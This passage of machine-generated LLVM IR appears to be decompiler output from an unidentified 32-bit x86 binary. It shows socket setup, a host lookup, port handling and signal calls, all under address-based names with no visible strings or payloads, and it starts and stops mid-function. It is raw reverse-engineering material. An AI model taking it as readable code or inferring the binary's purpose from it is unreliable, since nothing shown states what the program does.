  store i32 2, i32* %v2_804f311, align 4
  %v1_804f313 = add i32 %v0_804f30c, -12
  %v2_804f313 = inttoptr i32 %v1_804f313 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052baf.25 to i32), i32* %v2_804f313, align 4
  %v0_804f318 = load i32, i32* @edi, align 4
  %v1_804f318 = add i32 %v0_804f318, 4
  %v2_804f318 = inttoptr i32 %v1_804f318 to i32*
  %v3_804f318 = load i32, i32* %v2_804f318, align 4
  store i32 %v3_804f318, i32* %ecx.global-to-local, align 4
  %v2_804f31b = add i32 %v0_804f30c, -16
  %v3_804f31b = inttoptr i32 %v2_804f31b to i32*
  store i32 %v3_804f318, i32* %v3_804f31b, align 4
  %v0_804f31c = call i32 @function_8050986()
  store i32 %v0_804f31c, i32* %eax.global-to-local, align 4
  %v0_804f324 = load i32, i32* @edi, align 4
  %v1_804f324 = add i32 %v0_804f324, 12
  %v2_804f324 = inttoptr i32 %v1_804f324 to i32*
  store i32 4, i32* %v2_804f324, align 4
  br label %dec_label_pc_804ed71

dec_label_pc_804f330:                             ; preds = %dec_label_pc_804f21f
  %v0_804f330 = load i32, i32* @esp, align 4
  %v1_804f333 = add i32 %v0_804f330, -16
  %v2_804f333 = inttoptr i32 %v1_804f333 to i32*
  store i32 26, i32* %v2_804f333, align 4
  %v0_804f335 = call i32 @function_804f6e0()
  store i32 %v0_804f335, i32* %eax.global-to-local, align 4
  %v0_804f33a = load i32, i32* @esp, align 4
  %v1_804f33a = inttoptr i32 %v0_804f33a to i32*
  store i32 27, i32* %v1_804f33a, align 4
  %v0_804f341 = call i32 @function_804f6e0()
  store i32 %v0_804f341, i32* %eax.global-to-local, align 4
  %v0_804f346 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f2e7

dec_label_pc_804f34b:                             ; preds = %dec_label_pc_804ed28
  store i32 %v0_804f34b, i32* @eax, align 4
  %v0_804f34d = call i32 @function_804de10()
  store i32 %v0_804f34d, i32* %eax.global-to-local, align 4
  %v0_804f352 = load i32, i32* @esp, align 4
  %v1_804f352 = add i32 %v0_804f352, 32
  %v2_804f352 = inttoptr i32 %v1_804f352 to i32*
  store i32 -1, i32* %v2_804f352, align 4
  br label %dec_label_pc_804ed71

dec_label_pc_804f35f:                             ; preds = %dec_label_pc_804f0e9
  %v0_804f35f = load i32, i32* @esp, align 4
  %v1_804f362 = add i32 %v0_804f35f, -16
  %v2_804f362 = inttoptr i32 %v1_804f362 to i32*
  store i32 25, i32* %v2_804f362, align 4
  %v0_804f364 = call i32 @function_804f6e0()
  store i32 %v0_804f364, i32* %eax.global-to-local, align 4
  %v0_804f369 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f158

dec_label_pc_804f371:                             ; preds = %dec_label_pc_804eceb
  store i32 9, i32* %v1_804f37b, align 4
  %v0_804f382 = call i32 @function_804f760()
  store i32 %v0_804f382, i32* %eax.global-to-local, align 4
  %v0_804f387 = load i32, i32* @esp, align 4
  %v1_804f387 = inttoptr i32 %v0_804f387 to i32*
  %v3_804f387 = add i32 %v0_804f387, 4
  %v1_804f388 = inttoptr i32 %v3_804f387 to i32*
  %v1_804f389 = add i32 %v0_804f387, 1880
  store i32 %v1_804f389, i32* %eax.global-to-local, align 4
  store i32 %v1_804f389, i32* %v1_804f388, align 4
  store i32 9, i32* %v1_804f387, align 4
  %v0_804f393 = call i32 @function_804f6b0()
  store i32 %v0_804f393, i32* %eax.global-to-local, align 4
  %v0_804f398 = load i32, i32* @esp, align 4
  %v1_804f398 = add i32 %v0_804f398, 1880
  %v2_804f398 = inttoptr i32 %v1_804f398 to i32*
  %v3_804f398 = load i32, i32* %v2_804f398, align 4
  %v1_804f39f = add i32 %v3_804f398, -1
  store i32 %v1_804f39f, i32* %edx.global-to-local, align 4
  %v2_804f3a0 = add i32 %v0_804f398, -4
  %v3_804f3a0 = inttoptr i32 %v2_804f3a0 to i32*
  store i32 %v1_804f39f, i32* %v3_804f3a0, align 4
  %v2_804f3a1 = add i32 %v0_804f398, -8
  %v3_804f3a1 = inttoptr i32 %v2_804f3a1 to i32*
  store i32 %v0_804f393, i32* %v3_804f3a1, align 4
  %v0_804f3a2 = load i32, i32* @edi, align 4
  %v1_804f3a2 = add i32 %v0_804f3a2, 24
  %v2_804f3a2 = inttoptr i32 %v1_804f3a2 to i32*
  %v3_804f3a2 = load i32, i32* %v2_804f3a2, align 4
  store i32 %v3_804f3a2, i32* @esi, align 4
  %v2_804f3a5 = add i32 %v0_804f398, -12
  %v3_804f3a5 = inttoptr i32 %v2_804f3a5 to i32*
  store i32 %v3_804f3a2, i32* %v3_804f3a5, align 4
  %v1_804f3a6 = add i32 %v0_804f398, 32
  %v2_804f3a6 = inttoptr i32 %v1_804f3a6 to i32*
  %v3_804f3a6 = load i32, i32* %v2_804f3a6, align 4
  store i32 %v3_804f3a6, i32* @ebx, align 4
  %v2_804f3aa = add i32 %v0_804f398, -16
  %v3_804f3aa = inttoptr i32 %v2_804f3aa to i32*
  store i32 %v3_804f3a6, i32* %v3_804f3aa, align 4
  %v0_804f3ab = call i32 @function_804fde0()
  store i32 %v0_804f3ab, i32* %eax.global-to-local, align 4
  %v1_804f3b0 = load i32, i32* @esp, align 4
  %v2_804f3b0 = add i32 %v1_804f3b0, 64
  %v3_804f3b0 = inttoptr i32 %v2_804f3b0 to i32*
  store i32 %v0_804f3ab, i32* %v3_804f3b0, align 4
  %v0_804f3b4 = load i32, i32* @esp, align 4
  %v1_804f3b7 = add i32 %v0_804f3b4, 16
  %v2_804f3b7 = inttoptr i32 %v1_804f3b7 to i32*
  store i32 9, i32* %v2_804f3b7, align 4
  %v0_804f3b9 = call i32 @function_804f6e0()
  store i32 %v0_804f3b9, i32* %eax.global-to-local, align 4
  %v0_804f3be = load i32, i32* @esp, align 4
  %v1_804f3c1 = add i32 %v0_804f3be, 48
  %v2_804f3c1 = inttoptr i32 %v1_804f3c1 to i32*
  %v3_804f3c1 = load i32, i32* %v2_804f3c1, align 4
  %v13_804f3c1 = icmp eq i32 %v3_804f3c1, -1
  br i1 %v13_804f3c1, label %dec_label_pc_804e9ec.backedge, label %dec_label_pc_804f3cc

dec_label_pc_804f3cc:                             ; preds = %dec_label_pc_804f371
  %v1_804f3be = add i32 %v0_804f3be, 16
  store i32 %v3_804f3c1, i32* %ecx.global-to-local, align 4
  %tmp124 = icmp slt i32 %v3_804f3c1, 1
  br i1 %tmp124, label %dec_label_pc_804f058, label %dec_label_pc_804f3d8

dec_label_pc_804f3d8:                             ; preds = %dec_label_pc_804f3cc
  %v0_804f3d8 = load i32, i32* @edi, align 4
  %v1_804f3d8 = inttoptr i32 %v0_804f3d8 to i32*
  %v2_804f3d8 = load i32, i32* %v1_804f3d8, align 4
  store i32 %v2_804f3d8, i32* %edx.global-to-local, align 4
  %v1_804f3da = add i32 %v0_804f3d8, 16
  %v2_804f3da = inttoptr i32 %v1_804f3da to i32*
  %v3_804f3da = load i32, i32* %v2_804f3da, align 4
  store i32 %v3_804f3da, i32* %eax.global-to-local, align 4
  %v2_804f3dd = add i32 %v0_804f3be, 52
  %v3_804f3dd = inttoptr i32 %v2_804f3dd to i32*
  store i32 %v2_804f3d8, i32* %v3_804f3dd, align 4
  %v0_804f3e1 = load i32, i32* @edi, align 4
  %v1_804f3e1 = add i32 %v0_804f3e1, 20
  %v2_804f3e1 = inttoptr i32 %v1_804f3e1 to i32*
  %v3_804f3e1 = load i32, i32* %v2_804f3e1, align 4
  store i32 %v3_804f3e1, i32* %edx.global-to-local, align 4
  %v0_804f3e4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f3e4 = load i32, i32* @esp, align 4
  %v2_804f3e4 = add i32 %v1_804f3e4, 1872
  %v3_804f3e4 = inttoptr i32 %v2_804f3e4 to i32*
  store i32 %v0_804f3e4, i32* %v3_804f3e4, align 4
  %v0_804f3eb = load i32, i32* %edx.global-to-local, align 4
  %v1_804f3eb = trunc i32 %v0_804f3eb to i16
  %v2_804f3eb = load i32, i32* @esp, align 4
  %v3_804f3eb = add i32 %v2_804f3eb, 1882
  %v4_804f3eb = inttoptr i32 %v3_804f3eb to i16*
  store i16 %v1_804f3eb, i16* %v4_804f3eb, align 2
  %v0_804f3f3 = call i32 @function_8050281()
  store i32 %v0_804f3f3, i32* %eax.global-to-local, align 4
  %tmp125 = icmp slt i32 %v0_804f3f3, 1
  br i1 %tmp125, label %dec_label_pc_804f503, label %dec_label_pc_804f400

dec_label_pc_804f400:                             ; preds = %dec_label_pc_804f503, %dec_label_pc_804f3d8, %dec_label_pc_804f543
  %v0_804f400 = load i32, i32* @esp, align 4
  %v0_804f403 = load i32, i32* @edi, align 4
  %v1_804f403 = add i32 %v0_804f403, 4
  %v2_804f403 = inttoptr i32 %v1_804f403 to i32*
  %v3_804f403 = load i32, i32* %v2_804f403, align 4
  store i32 %v3_804f403, i32* %eax.global-to-local, align 4
  %v2_804f406 = add i32 %v0_804f400, -16
  %v3_804f406 = inttoptr i32 %v2_804f406 to i32*
  store i32 %v3_804f403, i32* %v3_804f406, align 4
  %v1_804f407 = call i32 @function_8050253(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804f407, i32* %eax.global-to-local, align 4
  %v0_804f40f = load i32, i32* @edi, align 4
  %v1_804f40f = add i32 %v0_804f40f, 4
  %v2_804f40f = inttoptr i32 %v1_804f40f to i32*
  store i32 -1, i32* %v2_804f40f, align 4
  %v0_804f416 = load i32, i32* @edi, align 4
  %v1_804f416 = add i32 %v0_804f416, 12
  %v2_804f416 = inttoptr i32 %v1_804f416 to i32*
  store i32 0, i32* %v2_804f416, align 4
  br label %dec_label_pc_804ed71

dec_label_pc_804f422:                             ; preds = %dec_label_pc_804efae
  %v1_804f422 = add i32 %v0_804ef9a, 32
  %v2_804f422 = inttoptr i32 %v1_804f422 to i32*
  %v3_804f422 = load i32, i32* %v2_804f422, align 4
  %v1_804f426 = add i32 %v0_804efa1, 3
  store i32 %v1_804f426, i32* @ebx, align 4
  %v1_804f429 = add i32 %v3_804f422, 3
  store i32 %v1_804f429, i32* %v2_804f422, align 4
  %v0_804f430 = load i32, i32* @esp, align 4
  %v1_804f430 = add i32 %v0_804f430, -4
  %v2_804f430 = inttoptr i32 %v1_804f430 to i32*
  store i32 16384, i32* %v2_804f430, align 4
  %v1_804f435 = add i32 %v0_804f430, -8
  %v2_804f435 = inttoptr i32 %v1_804f435 to i32*
  store i32 3, i32* %v2_804f435, align 4
  %v1_804f437 = add i32 %v0_804f430, 1879
  store i32 %v1_804f437, i32* %eax.global-to-local, align 4
  %v2_804f43e = add i32 %v0_804f430, -12
  %v3_804f43e = inttoptr i32 %v2_804f43e to i32*
  store i32 %v1_804f437, i32* %v3_804f43e, align 4
  %v0_804f43f = load i32, i32* @edi, align 4
  %v1_804f43f = add i32 %v0_804f43f, 4
  %v2_804f43f = inttoptr i32 %v1_804f43f to i32*
  %v3_804f43f = load i32, i32* %v2_804f43f, align 4
  store i32 %v3_804f43f, i32* %eax.global-to-local, align 4
  %v2_804f442 = add i32 %v0_804f430, -16
  %v3_804f442 = inttoptr i32 %v2_804f442 to i32*
  store i32 %v3_804f43f, i32* %v3_804f442, align 4
  %v0_804f443 = call i32 @function_8050986()
  %v0_804f448 = load i32, i32* @esp, align 4
  %v1_804f448 = add i32 %v0_804f448, -4
  %v2_804f448 = inttoptr i32 %v1_804f448 to i32*
  store i32 16384, i32* %v2_804f448, align 4
  %v1_804f44d = add i32 %v0_804f448, -8
  %v2_804f44d = inttoptr i32 %v1_804f44d to i32*
  store i32 9, i32* %v2_804f44d, align 4
  %v1_804f44f = add i32 %v0_804f448, 1863
  store i32 %v1_804f44f, i32* %eax.global-to-local, align 4
  %v2_804f456 = add i32 %v0_804f448, -12
  %v3_804f456 = inttoptr i32 %v2_804f456 to i32*
  store i32 %v1_804f44f, i32* %v3_804f456, align 4
  %v0_804f457 = load i32, i32* @edi, align 4
  %v1_804f457 = add i32 %v0_804f457, 4
  %v2_804f457 = inttoptr i32 %v1_804f457 to i32*
  %v3_804f457 = load i32, i32* %v2_804f457, align 4
  store i32 %v3_804f457, i32* %eax.global-to-local, align 4
  %v2_804f45a = add i32 %v0_804f448, -16
  %v3_804f45a = inttoptr i32 %v2_804f45a to i32*
  store i32 %v3_804f457, i32* %v3_804f45a, align 4
  %v0_804f45b = call i32 @function_8050986()
  store i32 %v0_804f45b, i32* %eax.global-to-local, align 4
  %v0_804f460 = load i32, i32* @esp, align 4
  %v1_804f460 = add i32 %v0_804f460, 32
  %v0_804f463 = load i32, i32* @edi, align 4
  %v1_804f463 = add i32 %v0_804f463, 24
  %v2_804f463 = inttoptr i32 %v1_804f463 to i32*
  %v3_804f463 = load i32, i32* %v2_804f463, align 4
  store i32 %v3_804f463, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ea81.backedge

dec_label_pc_804ea81.backedge:                    ; preds = %dec_label_pc_804f422, %dec_label_pc_804ef16
  %v0_804ea81 = phi i32 [ %v1_804f460, %dec_label_pc_804f422 ], [ %v0_804ea81.pre, %dec_label_pc_804ef16 ]
  %v4_804ea81.be = phi i32 [ %v3_804f463, %dec_label_pc_804f422 ], [ %v4_804ea81.pre.pre, %dec_label_pc_804ef16 ]
  %v1_804ea81 = add i32 %v0_804ea81, 32
  %v2_804ea81 = inttoptr i32 %v1_804ea81 to i32*
  %v3_804ea81 = load i32, i32* %v2_804ea81, align 4
  %v5_804ea81 = sub i32 %v3_804ea81, %v4_804ea81.be
  %v11_804ea81 = xor i32 %v3_804ea81, %v4_804ea81.be
  %v12_804ea81 = xor i32 %v5_804ea81, %v3_804ea81
  %v13_804ea81 = and i32 %v12_804ea81, %v11_804ea81
  %v14_804ea81 = icmp slt i32 %v13_804ea81, 0
  %v16_804ea81 = icmp slt i32 %v5_804ea81, 0
  %v2_804ea85 = icmp eq i1 %v16_804ea81, %v14_804ea81
  br i1 %v2_804ea85, label %dec_label_pc_804eb03, label %dec_label_pc_804ea87.preheader

dec_label_pc_804f46b:                             ; preds = %dec_label_pc_804f293
  %v0_804f46b = load i32, i32* @esp, align 4
  %v1_804f46e = add i32 %v0_804f46b, -16
  %v2_804f46e = inttoptr i32 %v1_804f46e to i32*
  store i32 26, i32* %v2_804f46e, align 4
  %v0_804f470 = call i32 @function_804f6e0()
  store i32 %v0_804f470, i32* %eax.global-to-local, align 4
  %v0_804f475 = load i32, i32* @esp, align 4
  %v1_804f475 = inttoptr i32 %v0_804f475 to i32*
  store i32 27, i32* %v1_804f475, align 4
  %v0_804f47c = call i32 @function_804f6e0()
  store i32 %v0_804f47c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e9ec.backedge

dec_label_pc_804e9ec.backedge:                    ; preds = %dec_label_pc_804f0f5, %dec_label_pc_804f058, %dec_label_pc_804ea62, %dec_label_pc_804ee99, %dec_label_pc_804ee5b, %dec_label_pc_804edde, %dec_label_pc_804eda0, %dec_label_pc_804f371, %dec_label_pc_804ec6e, %dec_label_pc_804ec30, %dec_label_pc_804f1a2, %dec_label_pc_804ebe5, %dec_label_pc_804f070, %dec_label_pc_804eba0, %dec_label_pc_804f140, %dec_label_pc_804f2c3, %dec_label_pc_804ee84, %dec_label_pc_804ec22, %dec_label_pc_804edc9, %dec_label_pc_804ec59, %dec_label_pc_804ebdd, %dec_label_pc_804f46b
  %v0_804e9ec = load i32, i32* @edi, align 4
  %v1_804e9ec = add i32 %v0_804e9ec, 12
  %v2_804e9ec = inttoptr i32 %v1_804e9ec to i32*
  %v3_804e9ec = load i32, i32* %v2_804e9ec, align 4
  store i32 %v3_804e9ec, i32* %eax.global-to-local, align 4
  %v1_804e9ef = icmp eq i32 %v3_804e9ec, 0
  br i1 %v1_804e9ef, label %dec_label_pc_804e8fd, label %dec_label_pc_804e9ec.backedge.dec_label_pc_804e9f7_crit_edge

dec_label_pc_804e9ec.backedge.dec_label_pc_804e9f7_crit_edge: ; preds = %dec_label_pc_804e9ec.backedge
  %v1_804e9fa.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e9f7

dec_label_pc_804f489:                             ; preds = %dec_label_pc_804e9c2, %dec_label_pc_804e98c
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f48b

dec_label_pc_804f48b:                             ; preds = %dec_label_pc_804e9d4, %dec_label_pc_804f489
  %v0_804f48e = phi i32 [ 0, %dec_label_pc_804f489 ], [ %v0_804e9c3, %dec_label_pc_804e9d4 ]
  %v0_804f48b = load i32, i32* @edi, align 4
  %v1_804f48b = add i32 %v0_804f48b, 4
  %v2_804f48b = inttoptr i32 %v1_804f48b to i32*
  %v3_804f48b = load i32, i32* %v2_804f48b, align 4
  store i32 %v3_804f48b, i32* %ecx.global-to-local, align 4
  %v2_804f48e = inttoptr i32 %v0_804f48b to i32*
  store i32 %v0_804f48e, i32* %v2_804f48e, align 4
  %v0_804f490 = load i32, i32* @edi, align 4
  %v1_804f490 = add i32 %v0_804f490, 24
  %v2_804f490 = inttoptr i32 %v1_804f490 to i32*
  store i32 0, i32* %v2_804f490, align 4
  %v0_804e8e2.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804e8ea.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e8e2

dec_label_pc_804f49c:                             ; preds = %dec_label_pc_804efca
  %v1_804f49c = add i32 %v0_804ea35, 56
  %v2_804f49c = inttoptr i32 %v1_804f49c to i32*
  %v3_804f49c = load i32, i32* %v2_804f49c, align 4
  store i32 %v3_804f49c, i32* %eax.global-to-local, align 4
  %v1_804f4a0 = inttoptr i32 %v3_804f49c to i32*
  store i32 104, i32* %v1_804f4a0, align 4
  %v0_804efe6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804efe6

dec_label_pc_804f4ab:                             ; preds = %dec_label_pc_804efe6
  store i32 %v0_804f4ab, i32* @eax, align 4
  %v0_804f4ad = call i32 @function_804de10()
  store i32 %v0_804f4ad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e8fd

dec_label_pc_804f4b7:                             ; preds = %dec_label_pc_804e946
  %v0_804f4ba = load i32, i32* @edi, align 4
  %v1_804f4ba = add i32 %v0_804f4ba, 4
  %v2_804f4ba = inttoptr i32 %v1_804f4ba to i32*
  %v3_804f4ba = load i32, i32* %v2_804f4ba, align 4
  store i32 %v3_804f4ba, i32* %eax.global-to-local, align 4
  %v2_804f4bd = add i32 %v0_804e97c, 16
  %v3_804f4bd = inttoptr i32 %v2_804f4bd to i32*
  store i32 %v3_804f4ba, i32* %v3_804f4bd, align 4
  %v1_804f4be = call i32 @function_8050253(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804f4be, i32* %eax.global-to-local, align 4
  %v0_804f4c6 = load i32, i32* @edi, align 4
  %v1_804f4c6 = add i32 %v0_804f4c6, 4
  %v2_804f4c6 = inttoptr i32 %v1_804f4c6 to i32*
  store i32 -1, i32* %v2_804f4c6, align 4
  %v0_804f4cd = load i32, i32* @edi, align 4
  %v1_804f4cd = add i32 %v0_804f4cd, 284
  %v2_804f4cd = inttoptr i32 %v1_804f4cd to i8*
  store i8 0, i8* %v2_804f4cd, align 1
  %v0_804f4d4 = load i32, i32* @edi, align 4
  %v1_804f4d4 = add i32 %v0_804f4d4, 12
  %v2_804f4d4 = inttoptr i32 %v1_804f4d4 to i32*
  store i32 0, i32* %v2_804f4d4, align 4
  br label %dec_label_pc_804e8fd

dec_label_pc_804f4e0:                             ; preds = %dec_label_pc_804e815, %dec_label_pc_804e7f5
  %v0_804f4e0 = phi i32 [ %v0_804e80b, %dec_label_pc_804e7f5 ], [ %v0_804f4e0.pre, %dec_label_pc_804e815 ]
  %v1_804f4e0 = add i32 %v0_804f4e0, 284
  %v2_804f4e0 = inttoptr i32 %v1_804f4e0 to i8*
  store i8 0, i8* %v2_804f4e0, align 1
  %v0_804f4e7 = load i32, i32* @ebx, align 4
  %v1_804f4e7 = add i32 %v0_804f4e7, 12
  %v2_804f4e7 = inttoptr i32 %v1_804f4e7 to i32*
  store i32 0, i32* %v2_804f4e7, align 4
  br label %dec_label_pc_804e7b3

dec_label_pc_804f4f3:                             ; preds = %dec_label_pc_804efb8
  %v11_804f4f3 = icmp eq i8 %v2_804efb8, -5
  %v1_804f4f5 = icmp eq i1 %v11_804f4f3, false
  br i1 %v1_804f4f5, label %dec_label_pc_804eab3, label %dec_label_pc_804f4fb

dec_label_pc_804f4fb:                             ; preds = %dec_label_pc_804f4f3
  store i8 -3, i8* %v1_804efb8, align 1
  br label %dec_label_pc_804eab3

dec_label_pc_804f503:                             ; preds = %dec_label_pc_804f3d8
  %v1_804f503 = add i32 %v0_804f3f3, 1
  %v8_804f503 = icmp eq i32 %v1_804f503, 0
  store i32 %v1_804f503, i32* %eax.global-to-local, align 4
  br i1 %v8_804f503, label %dec_label_pc_804f400, label %dec_label_pc_804f50a

dec_label_pc_804f50a:                             ; preds = %dec_label_pc_804f503
  %v0_804f50a = load i32, i32* @ecx, align 4
  %v1_804f50a = load i32, i32* @esp, align 4
  %v2_804f50a = add i32 %v1_804f50a, -4
  %v3_804f50a = inttoptr i32 %v2_804f50a to i32*
  store i32 %v0_804f50a, i32* %v3_804f50a, align 4
  %v1_804f50b = add i32 %v1_804f50a, -8
  %v2_804f50b = inttoptr i32 %v1_804f50b to i32*
  store i32 0, i32* %v2_804f50b, align 4
  %v1_804f50d = add i32 %v1_804f50a, -12
  %v2_804f50d = inttoptr i32 %v1_804f50d to i32*
  store i32 1, i32* %v2_804f50d, align 4
  %v1_804f50f = add i32 %v1_804f50a, -16
  %v2_804f50f = inttoptr i32 %v1_804f50f to i32*
  store i32 2, i32* %v2_804f50f, align 4
  %v4_804f511 = call i32 @function_8050a37(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804f511, i32* @eax, align 4
  %v0_804f516 = load i32, i32* @esp, align 4
  store i32 %v4_804f511, i32* @ebp, align 4
  %v10_804f51b = icmp eq i32 %v4_804f511, -1
  %v2_804e5c8 = inttoptr i32 %v0_804f516 to i32*
  br i1 %v10_804f51b, label %dec_label_pc_804e5c5, label %dec_label_pc_804f524

dec_label_pc_804f524:                             ; preds = %dec_label_pc_804f50a
  store i32 2, i32* %v2_804e5c8, align 4
  %v0_804f529 = call i32 @function_804f760()
  store i32 %v0_804f529, i32* %eax.global-to-local, align 4
  %v0_804f52e = load i32, i32* @esp, align 4
  %v1_804f52e = inttoptr i32 %v0_804f52e to i32*
  store i32 ptrtoint ([22 x i8]* @global_var_8052b22.26 to i32), i32* %v1_804f52e, align 4
  %v0_804f535 = call i32 @function_804d970()
  store i32 %v0_804f535, i32* %eax.global-to-local, align 4
  %v0_804f53a = load i32, i32* @esp, align 4
  store i32 %v0_804f535, i32* @esi, align 4
  %v2_804f53f = icmp eq i32 %v0_804f535, 0
  %v1_804f541 = icmp eq i1 %v2_804f53f, false
  %v1_804f57f = add i32 %v0_804f53a, 1844
  %v2_804f57f = inttoptr i32 %v1_804f57f to i16*
  store i16 2, i16* %v2_804f57f, align 2
  br i1 %v1_804f541, label %dec_label_pc_804f57f, label %dec_label_pc_804f543

dec_label_pc_804f543:                             ; preds = %dec_label_pc_804f524
  %v0_804f54d = load i32, i32* @esp, align 4
  %v1_804f550 = add i32 %v0_804f54d, -16
  %v2_804f550 = inttoptr i32 %v1_804f550 to i32*
  store i32 ptrtoint ([15 x i8]* @global_var_8052b38.27 to i32), i32* %v2_804f550, align 4
  %v0_804f555 = call i32 @function_805080c()
  store i32 %v0_804f555, i32* %eax.global-to-local, align 4
  %v1_804f55a = load i32, i32* @esp, align 4
  %v2_804f55a = add i32 %v1_804f55a, 1848
  %v3_804f55a = inttoptr i32 %v2_804f55a to i32*
  store i32 %v0_804f555, i32* %v3_804f55a, align 4
  %v0_804f561 = load i32, i32* @esp, align 4
  %v1_804f561 = inttoptr i32 %v0_804f561 to i32*
  %v2_804f561 = load i32, i32* %v1_804f561, align 4
  store i32 %v2_804f561, i32* %eax.global-to-local, align 4
  %v3_804f561 = add i32 %v0_804f561, 4
  %v1_804f562 = inttoptr i32 %v3_804f561 to i32*
  %v2_804f562 = load i32, i32* %v1_804f562, align 4
  store i32 %v2_804f562, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804f562, align 4
  store i32 2, i32* %v1_804f561, align 4
  %v0_804f567 = call i32 @function_804f6b0()
  %v1_804f567 = inttoptr i32 %v0_804f567 to i16*
  store i32 %v0_804f567, i32* %eax.global-to-local, align 4
  %v3_804f56c = load i16, i16* %v1_804f567, align 2
  %v4_804f56c = zext i16 %v3_804f56c to i32
  %v7_804f56c = and i32 %v0_804f567, -65536
  %v8_804f56c = or i32 %v4_804f56c, %v7_804f56c
  store i32 %v8_804f56c, i32* %eax.global-to-local, align 4
  %v2_804f56f = load i32, i32* @esp, align 4
  %v3_804f56f = add i32 %v2_804f56f, 1846
  %v4_804f56f = inttoptr i32 %v3_804f56f to i16*
  store i16 %v3_804f56c, i16* %v4_804f56f, align 2
  br label %dec_label_pc_804f400

dec_label_pc_804f57f:                             ; preds = %dec_label_pc_804f524
  %v2_804f589 = add i32 %v0_804f535, 4
  %v3_804f589 = inttoptr i32 %v2_804f589 to i32*
  %v4_804f589 = load i32, i32* %v3_804f589, align 4
  store i32 %v4_804f589, i32* @ebx, align 4
  %v1_804f58c = call i32 @function_804d700(i32 ptrtoint (i32* @0 to i32))
  %v2_804f58c = sext i32 %v1_804f58c to i64
  store i32 %v1_804f58c, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804f593 = load i32, i32* @esi, align 4
  %v1_804f593 = inttoptr i32 %v0_804f593 to i8*
  %v2_804f593 = load i8, i8* %v1_804f593, align 1
  %v3_804f593 = zext i8 %v2_804f593 to i32
  store i32 %v3_804f593, i32* %ecx.global-to-local, align 4
  %v8_804f599 = zext i8 %v2_804f593 to i64
  %v9_804f599 = udiv i64 %v2_804f58c, %v8_804f599
  %v10_804f599 = trunc i64 %v9_804f599 to i32
  store i32 %v10_804f599, i32* %eax.global-to-local, align 4
  %v11_804f599 = urem i64 %v2_804f58c, %v8_804f599
  %v12_804f599 = trunc i64 %v11_804f599 to i32
  store i32 %v12_804f599, i32* %edx.global-to-local, align 4
  %v0_804f59b = load i32, i32* @ebx, align 4
  %v2_804f59b = mul nuw nsw i32 %v12_804f599, 4
  %v3_804f59b = add i32 %v2_804f59b, %v0_804f59b
  %v4_804f59b = inttoptr i32 %v3_804f59b to i32*
  %v5_804f59b = load i32, i32* %v4_804f59b, align 4
  store i32 %v5_804f59b, i32* %eax.global-to-local, align 4
  %v1_804f59e = load i32, i32* @esp, align 4
  %v2_804f59e = add i32 %v1_804f59e, 1832
  %v3_804f59e = inttoptr i32 %v2_804f59e to i32*
  store i32 %v5_804f59b, i32* %v3_804f59e, align 4
  %v0_804f5a5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f5a5 = load i32, i32* @esp, align 4
  %v2_804f5a5 = add i32 %v1_804f5a5, -4
  %v3_804f5a5 = inttoptr i32 %v2_804f5a5 to i32*
  store i32 %v0_804f5a5, i32* %v3_804f5a5, align 4
  %v0_804f5a6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f5a6 = add i32 %v1_804f5a5, -8
  %v3_804f5a6 = inttoptr i32 %v2_804f5a6 to i32*
  store i32 %v0_804f5a6, i32* %v3_804f5a6, align 4
  %v1_804f5a7 = add i32 %v1_804f5a5, -12
  %v2_804f5a7 = inttoptr i32 %v1_804f5a7 to i32*
  store i32 0, i32* %v2_804f5a7, align 4
  %v1_804f5a9 = add i32 %v1_804f5a5, -16
  %v2_804f5a9 = inttoptr i32 %v1_804f5a9 to i32*
  store i32 2, i32* %v2_804f5a9, align 4
  %v0_804f5ab = call i32 @function_804f6b0()
  %v1_804f5ab = inttoptr i32 %v0_804f5ab to i16*
  store i32 %v0_804f5ab, i32* %eax.global-to-local, align 4
  %v3_804f5b0 = load i16, i16* %v1_804f5ab, align 2
  %v4_804f5b0 = zext i16 %v3_804f5b0 to i32
  %v7_804f5b0 = and i32 %v0_804f5ab, -65536
  %v8_804f5b0 = or i32 %v4_804f5b0, %v7_804f5b0
  store i32 %v8_804f5b0, i32* %eax.global-to-local, align 4
  %v0_804f5b3 = load i32, i32* @esi, align 4
  %v1_804f5b3 = load i32, i32* @esp, align 4
  %v2_804f5b3 = inttoptr i32 %v1_804f5b3 to i32*
  store i32 %v0_804f5b3, i32* %v2_804f5b3, align 4
  %v0_804f5b6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f5b6 = trunc i32 %v0_804f5b6 to i16
  %v2_804f5b6 = load i32, i32* @esp, align 4
  %v3_804f5b6 = add i32 %v2_804f5b6, 1846
  %v4_804f5b6 = inttoptr i32 %v3_804f5b6 to i16*
  store i16 %v1_804f5b6, i16* %v4_804f5b6, align 2
  %v0_804f5be = call i32 @function_804d930()
  store i32 %v0_804f5be, i32* %eax.global-to-local, align 4
  %v0_804f5c3 = load i32, i32* @esp, align 4
  %v1_804f5c3 = inttoptr i32 %v0_804f5c3 to i32*
  store i32 2, i32* %v1_804f5c3, align 4
  %v0_804f5ca = call i32 @function_804f6e0()
  %v0_804f5cf = load i32, i32* @esp, align 4
  %v1_804f5cf = add i32 %v0_804f5cf, 1844
  store i32 %v1_804f5cf, i32* %eax.global-to-local, align 4
  %v1_804f5d9 = add i32 %v0_804f5cf, 8
  %v2_804f5d9 = inttoptr i32 %v1_804f5d9 to i32*
  store i32 16, i32* %v2_804f5d9, align 4
  %v0_804f5db = load i32, i32* %eax.global-to-local, align 4
